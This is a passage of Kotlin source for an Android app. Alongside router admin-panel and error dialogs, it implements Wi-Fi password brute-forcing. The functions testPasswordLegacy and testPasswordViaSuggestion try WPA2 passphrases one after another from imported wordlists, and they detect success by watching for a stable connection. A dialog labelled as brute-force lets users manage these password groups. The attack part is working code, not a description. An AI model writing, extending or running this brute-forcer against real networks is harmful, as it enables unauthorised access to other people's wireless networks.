                                    }
                                }
                            }
                            FilledTonalButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth(),
                                colors = androidx.compose.material3.ButtonDefaults.filledTonalButtonColors(
                                    containerColor = MaterialTheme.colorScheme.primary,
                                    contentColor = MaterialTheme.colorScheme.onPrimary
                                )
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }

                    HubDialogStage.AdminPanel -> {
                        val gatewayIp = getGatewayIpAddress(context)
                        if (gatewayIp != null) {
                            Column(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .height(600.dp)
                                    .padding(0.dp)
                            ) {
                                Row(
                                    modifier = Modifier
                                        .fillMaxWidth()
                                        .padding(horizontal = 16.dp, vertical = 12.dp),
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.SpaceBetween
                                ) {
                                    Text(
                                        text = stringResource(R.string.network_hub_admin_panel),
                                        style = MaterialTheme.typography.titleLarge,
                                        fontWeight = FontWeight.Bold,
                                        color = MaterialTheme.colorScheme.onSurface
                                    )
                                    IconButton(onClick = { closeDialog() }) {
                                        Icon(Icons.Filled.Close, contentDescription = null, tint = MaterialTheme.colorScheme.onSurface)
                                    }
                                }
                                AndroidView(
                                    factory = { ctx ->
                                        WebView(ctx).apply {
                                            settings.javaScriptEnabled = true
                                            settings.loadWithOverviewMode = true
                                            settings.useWideViewPort = true
                                            settings.builtInZoomControls = true
                                            settings.displayZoomControls = false
                                            settings.domStorageEnabled = true
                                            webViewClient = WebViewClient()
                                            loadUrl("http://$gatewayIp")
                                        }
                                    },
                                    modifier = Modifier.fillMaxSize()
                                )
                            }
                        } else {
                            Column(
                                modifier = Modifier.padding(24.dp),
                                horizontalAlignment = Alignment.CenterHorizontally,
                                verticalArrangement = Arrangement.spacedBy(16.dp)
                            ) {
                                Icon(
                                    imageVector = Icons.Filled.WifiOff,
                                    contentDescription = null,
                                    tint = MaterialTheme.colorScheme.error,
                                    modifier = Modifier.size(48.dp)
                                )
                                Text(
                                    text = "No Wi-Fi connection",
                                    style = MaterialTheme.typography.headlineSmall,
                                    fontWeight = FontWeight.Bold,
                                    color = MaterialTheme.colorScheme.error
                                )
                                Text(
                                    text = "Connect to a Wi-Fi network first",
                                    style = MaterialTheme.typography.bodyLarge,
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                                FilledTonalButton(
                                    onClick = { closeDialog() },
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Text(stringResource(R.string.cancel))
                                }
                            }
                        }
                    }

                    HubDialogStage.Error -> {
                        Column(
                            modifier = Modifier.padding(24.dp),
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.spacedBy(16.dp)
                        ) {
                            Icon(
                                imageVector = Icons.Filled.Close,
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.error,
                                modifier = Modifier.size(48.dp)
                            )
                            Text(
                                text = stringResource(R.string.network_hub_error_title),
                                style = MaterialTheme.typography.headlineSmall,
                                fontWeight = FontWeight.Bold,
                                color = MaterialTheme.colorScheme.error,
                            )
                            Text(
                                text = stringResource(R.string.network_hub_error_message),
                                style = MaterialTheme.typography.bodyLarge,
                                color = MaterialTheme.colorScheme.onSurfaceVariant,
                            )
                            FilledTonalButton(
                                onClick = { closeDialog() },
                                modifier = Modifier.fillMaxWidth()
                            ) {
                                Text(stringResource(R.string.cancel))
                            }
                        }
                    }
                }
            }
        }
    }

    if (showPasswordDialog) {
        BrutePasswordDialog(
            passwordGroups = passwordGroups,
            onImport = { fileImportLauncher.launch("text/plain") },
            onDismiss = { showPasswordDialog = false },
            onSave = { saveGroups(passwordGroups) }
        )
    }
}

private fun currentWifiSsid(wifiManager: WifiManager): String? {
    return try {
        val raw = wifiManager.connectionInfo?.ssid?.trim('"').orEmpty()
        if (raw.isEmpty() || raw == "<unknown ssid>") null else raw
    } catch (_: Exception) {
        null
    }
}


private fun isFullyConnectedToSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
    return try {
        val info = wifiManager.connectionInfo ?: return false
        val ssid = info.ssid?.trim('"').orEmpty()
        if (ssid.isEmpty() || ssid == "<unknown ssid>" || ssid != cleanSsid) return false
        info.supplicantState == SupplicantState.COMPLETED
    } catch (_: Exception) {
        false
    }
}


private fun isBusyOnSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
    return try {
        val info = wifiManager.connectionInfo ?: return false
        val ssid = info.ssid?.trim('"').orEmpty()
        if (ssid != cleanSsid) return false
        when (info.supplicantState) {
            SupplicantState.COMPLETED,
            SupplicantState.ASSOCIATED,
            SupplicantState.ASSOCIATING,
            SupplicantState.AUTHENTICATING,
            SupplicantState.FOUR_WAY_HANDSHAKE,
            SupplicantState.GROUP_HANDSHAKE,
            -> true
            else -> false
        }
    } catch (_: Exception) {
        false
    }
}

private fun clearAppWifiSuggestions(wifiManager: WifiManager) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
    runCatching { wifiManager.removeNetworkSuggestions(emptyList()) }
}

private fun prepareRadioForBrute(wifiManager: WifiManager, cleanSsid: String) {
    clearAppWifiSuggestions(wifiManager)
    if (isBusyOnSsid(wifiManager, cleanSsid)) {
        runCatching { wifiManager.disconnect() }
    }
    waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 8_000)
    Thread.sleep(800)
}

private fun settleAfterFailedAttempt(wifiManager: WifiManager, cleanSsid: String) {
    clearAppWifiSuggestions(wifiManager)
    if (isBusyOnSsid(wifiManager, cleanSsid)) {
        runCatching { wifiManager.disconnect() }
    }
    waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 10_000)
    Thread.sleep(1_200)
}

private fun waitUntilLeftTarget(wifiManager: WifiManager, cleanSsid: String, timeoutMs: Long) {
    val deadline = System.currentTimeMillis() + timeoutMs
    while (System.currentTimeMillis() < deadline) {
        if (!isBusyOnSsid(wifiManager, cleanSsid) && !isFullyConnectedToSsid(wifiManager, cleanSsid)) {
            Thread.sleep(400)
            if (!isBusyOnSsid(wifiManager, cleanSsid)) return
        }
        Thread.sleep(300)
    }
}

private fun waitForStableConnection(
    wifiManager: WifiManager,
    cleanSsid: String,
    timeoutMs: Long,
    stableMs: Long = 1_500,
): Boolean {
    val deadline = System.currentTimeMillis() + timeoutMs
    var stableSince = -1L
    while (System.currentTimeMillis() < deadline) {
        if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
            if (stableSince < 0) stableSince = System.currentTimeMillis()
            if (System.currentTimeMillis() - stableSince >= stableMs) {
                return true
            }
        } else {
            stableSince = -1L
        }
        Thread.sleep(300)
    }
    return false
}

private fun testWifiPassword(
    context: Context,
    wifiManager: WifiManager,
    ssid: String,
    password: String,
): Boolean {
    val cleanSsid = ssid.trim('"')
    if (isBusyOnSsid(wifiManager, cleanSsid)) {
        settleAfterFailedAttempt(wifiManager, cleanSsid)
    }
    if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
        return false
    }
    return when {
        Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ->
            testPasswordViaSuggestion(context, wifiManager, cleanSsid, password)
        else ->
            testPasswordLegacy(wifiManager, cleanSsid, password)
    }
}

private fun testPasswordLegacy(wifiManager: WifiManager, cleanSsid: String, password: String): Boolean {
    var netId = -1
    var ok = false
    return try {
        @Suppress("DEPRECATION")
        val wifiConfig = android.net.wifi.WifiConfiguration().apply {
            SSID = "\"" + cleanSsid + "\""
            preSharedKey = "\"" + password + "\""
            allowedKeyManagement.set(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_PSK)
            status = android.net.wifi.WifiConfiguration.Status.ENABLED
        }
        @Suppress("DEPRECATION")
        netId = wifiManager.addNetwork(wifiConfig)
        if (netId == -1) return false
        @Suppress("DEPRECATION")
        wifiManager.disconnect()
        Thread.sleep(500)
        @Suppress("DEPRECATION")
        if (!wifiManager.enableNetwork(netId, true)) return false
        @Suppress("DEPRECATION")
        wifiManager.reconnect()
        val deadline = System.currentTimeMillis() + 18_000
        var stableSince = -1L
        while (System.currentTimeMillis() < deadline) {
            val info = wifiManager.connectionInfo
            val good = info != null &&
                info.networkId == netId &&
                info.ssid?.trim('"') == cleanSsid &&
                info.supplicantState == SupplicantState.COMPLETED
            if (good) {
                if (stableSince < 0) stableSince = System.currentTimeMillis()
                if (System.currentTimeMillis() - stableSince >= 1_500) {
                    ok = true
                    break
                }
            } else {
                stableSince = -1L
            }
            Thread.sleep(300)
        }
        ok
    } catch (_: Exception) {
        false
    } finally {
        if (netId != -1 && !ok) {
            runCatching {
                @Suppress("DEPRECATION")
                wifiManager.removeNetwork(netId)
                @Suppress("DEPRECATION")
                wifiManager.saveConfiguration()
            }
            runCatching { wifiManager.disconnect() }
        }
    }
}

@androidx.annotation.RequiresApi(Build.VERSION_CODES.Q)
private fun testPasswordViaSuggestion(
    context: Context,
    wifiManager: WifiManager,
    cleanSsid: String,
    password: String,
): Boolean {
    var suggestion: WifiNetworkSuggestion? = null
    var success = false
    val connectivityManager =
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    var callback: ConnectivityManager.NetworkCallback? = null
    return try {
        clearAppWifiSuggestions(wifiManager)
        Thread.sleep(400)
        if (isBusyOnSsid(wifiManager, cleanSsid)) {
            runCatching { wifiManager.disconnect() }
            waitUntilLeftTarget(wifiManager, cleanSsid, 8_000)
        }
        if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
            return false
        }
        val builder = WifiNetworkSuggestion.Builder()
            .setSsid(cleanSsid)
            .setWpa2Passphrase(password)
            .setIsAppInteractionRequired(false)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            builder.setPriority(Int.MAX_VALUE)
        }
        suggestion = builder.build()
        val addStatus = wifiManager.addNetworkSuggestions(listOf(suggestion!!))
        if (addStatus != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
            return false
        }
        callback = object : ConnectivityManager.NetworkCallback() {}
        val request = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .build()
        runCatching { connectivityManager.registerNetworkCallback(request, callback!!) }
        success = waitForStableConnection(
            wifiManager = wifiManager,
            cleanSsid = cleanSsid,
            timeoutMs = 20_000,
            stableMs = 1_500,
        )
        success
    } catch (_: Exception) {
        false
    } finally {
        callback?.let { cb ->
            runCatching { connectivityManager.unregisterNetworkCallback(cb) }
        }
        if (!success) {
            suggestion?.let { s ->
                runCatching { wifiManager.removeNetworkSuggestions(listOf(s)) }
            }
            clearAppWifiSuggestions(wifiManager)
            if (isBusyOnSsid(wifiManager, cleanSsid)) {
                runCatching { wifiManager.disconnect() }
            }
        }

    }
}

@Composable
private fun BrutePasswordDialog(
    passwordGroups: MutableList<PasswordGroup>,
    onImport: () -> Unit,
    onDismiss: () -> Unit,
    onSave: () -> Unit
) {
    Dialog(
        onDismissRequest = onDismiss,
        properties = DialogProperties(dismissOnClickOutside = true)
    ) {
        Surface(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(28.dp),
            color = MaterialTheme.colorScheme.surfaceContainerHighest,
            tonalElevation = 8.dp
        ) {
            Column(
                modifier = Modifier.padding(20.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Text(
                        text = stringResource(R.string.wifi_brute_force_passwords),
                        style = MaterialTheme.typography.headlineSmall,
                        fontWeight = FontWeight.Bold
                    )
                    IconButton(onClick = onImport) {
                        Icon(Icons.Filled.Add, contentDescription = stringResource(R.string.wifi_import_passwords), tint = MaterialTheme.colorScheme.primary)
                    }
                }

                Text(
                    text = stringResource(R.string.wifi_brute_force_desc),
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                Surface(
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(240.dp),
                    shape = RoundedCornerShape(12.dp),
                    color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                ) {
                    LazyColumn(
                        modifier = Modifier.padding(vertical = 4.dp),
                        contentPadding = PaddingValues(4.dp),
                        verticalArrangement = Arrangement.spacedBy(4.dp)
                    ) {
                        itemsIndexed(passwordGroups, key = { _, group -> group.name }) { index, group ->
                            val count = group.passwords.size
                            val validCount = group.passwords.count { it.length >= 8 }
                            val canDismiss = group.isImported

                            val dismissState = rememberSwipeToDismissBoxState(
                                confirmValueChange = { value ->
                                    if (canDismiss && value == SwipeToDismissBoxValue.EndToStart) {
                                        passwordGroups.removeAt(index)
                                        onSave()
                                        true
                                    } else false
                                }
                            )
                            Box(modifier = Modifier.clip(RoundedCornerShape(12.dp))) {
                                SwipeToDismissBox(
                                    state = dismissState,
                                    backgroundContent = {
                                        if (canDismiss) {
                                            Box(
                                                modifier = Modifier
                                                    .fillMaxSize()
                                                    .clip(RoundedCornerShape(12.dp))
                                                    .background(Color(0xFFFF5252)),
                                                contentAlignment = Alignment.CenterEnd
                                            ) {
                                                Icon(
                                                    Icons.Default.Delete,
                                                    contentDescription = stringResource(R.string.cd_delete),
                                                    tint = Color.White,
                                                    modifier = Modifier.padding(end = 24.dp)
                                                )
                                            }
                                        }
                                    },
                                    enableDismissFromStartToEnd = false,
                                    enableDismissFromEndToStart = canDismiss,
                                ) {
                                MaterialCard(
                                    modifier = Modifier.fillMaxWidth(),
                                    accentColor = if (group.selected) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.onSurface.copy(alpha = 0.3f),
                                    cornerRadius = 12.dp,
                                    contentPadding = 0.dp
                                ) {
                                    Row(
                                        modifier = Modifier
                                            .fillMaxWidth()
                                            .padding(12.dp),
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.spacedBy(12.dp)
                                    ) {
                                        Checkbox(
                                            checked = group.selected,
                                            onCheckedChange = {
                                                group.selected = it
                                                onSave()
                                            }
                                        )
                                        Column(modifier = Modifier.weight(1f)) {
                                            Text(
                                                text = group.name,
                                                style = MaterialTheme.typography.titleMedium,
                                                fontWeight = FontWeight.Bold,
                                                color = MaterialTheme.colorScheme.onSurface
                                            )
                                            Text(
                                                text = stringResource(R.string.wifi_passwords_count, count, validCount),
                                                style = MaterialTheme.typography.bodySmall,
                                                color = TextGray
                                            )
                                        }
                                        if (group.isImported) {
                                            Text(
                                                text = "imported",
                                                style = MaterialTheme.typography.labelSmall,
                                                color = MaterialTheme.colorScheme.primary
                                            )
                                        }
                                    }
                                }
                            }
                            }
                        }
                    }
                }

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.End
                ) {
                    TextButton(onClick = onDismiss) {
                        Text(stringResource(R.string.cd_close))
                    }
                }
            }
        }
    }
}
